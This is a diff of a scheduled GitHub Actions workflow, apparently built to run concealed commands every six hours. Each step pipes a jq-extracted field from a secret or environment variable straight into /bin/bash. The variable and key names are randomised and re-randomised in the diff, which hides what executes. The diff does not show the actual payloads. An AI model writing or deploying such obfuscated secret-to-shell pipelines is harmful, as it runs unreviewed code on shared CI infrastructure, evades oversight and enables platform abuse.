@@ -3,27 +3,24 @@ name: minidisctransire
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
-
+    - cron: '35 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: minidisctransire
         env:
-          s70713: ${{ secrets.s70713 }}
+          qexi85: ${{ secrets.qexi85 }}
         run: |
-          echo $s70713 | jq -r .xx97275 | /bin/bash
-          echo $pwok72 | jq -r .agbkb5 | /bin/bash
-          echo $waodh42 | jq -r .ujz446 | /bin/bash
-          echo $zzfm7 | jq -r .sdlg89 | /bin/bash
-          echo $twvux6984 | jq -r .yfbn6400 | /bin/bash
-          echo $neguy6734 | jq -r .gkvks4 | /bin/bash
-          echo $ngzj7 | jq -r .nh363 | /bin/bash
-          echo $qwbkt7 | jq -r .wdaag18 | /bin/bash
-          echo $fe981 | jq -r .wanw5940 | /bin/bash
-          echo $lspak82732 | jq -r .km007 | /bin/bash
-          echo $mcczo30718 | jq -r .fm33092 | /bin/bash
-          echo $ecmd9448 | jq -r .vti336 | /bin/bash
+          echo $qexi85 | jq -r .fe79953 | /bin/bash
+          echo $bzw29 | jq -r .v40902 | /bin/bash
+          echo $qhx86718 | jq -r .o1061 | /bin/bash
+          echo $k97 | jq -r .oloi4 | /bin/bash
+          echo $iok13973 | jq -r .o591 | /bin/bash
+          echo $syw3878 | jq -r .tqfyl316 | /bin/bash
+          echo $djasr0 | jq -r .cupuc70 | /bin/bash
+          echo $s12 | jq -r .fglrx21 | /bin/bash
+          echo $vmj91008 | jq -r .wjfcj776 | /bin/bash
 
